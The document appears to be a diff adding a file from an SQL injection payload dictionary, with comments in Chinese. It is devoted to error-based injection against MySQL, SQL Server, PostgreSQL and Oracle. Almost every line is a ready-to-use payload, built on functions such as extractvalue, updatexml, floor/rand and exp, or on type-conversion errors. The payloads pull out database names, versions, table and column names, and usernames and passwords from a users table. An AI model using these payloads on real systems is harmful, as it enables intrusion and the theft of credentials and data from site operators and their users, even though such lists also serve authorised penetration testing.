@@ -1,0 +1,95 @@
+# ============================================================
+# SQL Injection Payload Dictionary — 05 报错注入类
+# 用途: 页面显示数据库错误信息时，通过报错函数提取数据
+# 适用: 主要是 MySQL（5.5+ ~ 5.7），部分适用于其他数据库
+# 原理: 利用数据库函数在报错信息中回显查询结果
+# ============================================================
+
+# ========== MySQL extractvalue() ==========
+# 注意: extractvalue 最长显示约 32 个字符
+
+# 获取当前数据库
+AND extractvalue(1,concat(0x7e,database()))--
+OR extractvalue(1,concat(0x7e,database()))--
+
+# 获取版本
+AND extractvalue(1,concat(0x7e,version()))--
+OR extractvalue(1,concat(0x7e,version()))--
+
+# 获取用户
+AND extractvalue(1,concat(0x7e,user()))--
+OR extractvalue(1,concat(0x7e,user()))--
+
+# 获取表名
+AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=database())))--
+
+# 获取列名
+AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_NAME='users')))--
+
+# 获取数据（一次一行）
+AND extractvalue(1,concat(0x7e,(SELECT CONCAT_WS('|',username,password) FROM users LIMIT 1 OFFSET 0)))--
+AND extractvalue(1,concat(0x7e,(SELECT CONCAT_WS('|',username,password) FROM users LIMIT 1 OFFSET 1)))--
+
+# 配合 substr 获取超长内容（逐段读取）
+AND extractvalue(1,concat(0x7e,substr((SELECT GROUP_CONCAT(password) FROM users),1,31)))--
+AND extractvalue(1,concat(0x7e,substr((SELECT GROUP_CONCAT(password) FROM users),32,31)))--
+
+# ========== MySQL updatexml() ==========
+
+# 获取数据库
+AND updatexml(1,concat(0x7e,database()),1)--
+OR updatexml(1,concat(0x7e,database()),1)--
+
+# 获取版本
+AND updatexml(1,concat(0x7e,version()),1)--
+OR updatexml(1,concat(0x7e,version()),1)--
+
+# 获取表名
+AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=database())),1)--
+
+# 获取列名
+AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_NAME='users')),1)--
+
+# 获取数据
+AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1)),1)--
+
+# ========== MySQL 主键重复报错 (Count(*)+Rand()+Group by) ==========
+#（经典 floor() 报错，MySQL 5.x 通用）
+
+AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# 获取表名
+AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# ========== MySQL exp() 函数报错 ==========
+
+AND exp(~(SELECT * FROM(SELECT database())a))--
+AND exp(~(SELECT * FROM(SELECT version())a))--
+AND exp(~(SELECT * FROM(SELECT user())a))--
+
+# ========== SQL Server ==========
+
+# 转换报错
+AND 1=CONVERT(int, @@version)--
+AND 1=CAST(@@version AS int)--
+AND 1=CONVERT(int, DB_NAME())--
+
+# 结合查询
+AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.tables))--
+
+# ========== PostgreSQL ==========
+
+# 类型转换报错
+AND 1=CAST(version() AS int)--
+AND 1=CAST(current_database() AS int)--
+AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+
+# ========== Oracle ==========
+
+# CTXSYS.DRITHSX.SN 报错
+AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
+
+# XMLType 报错
+AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE rownum=1)||CHR(62))) FROM dual)--
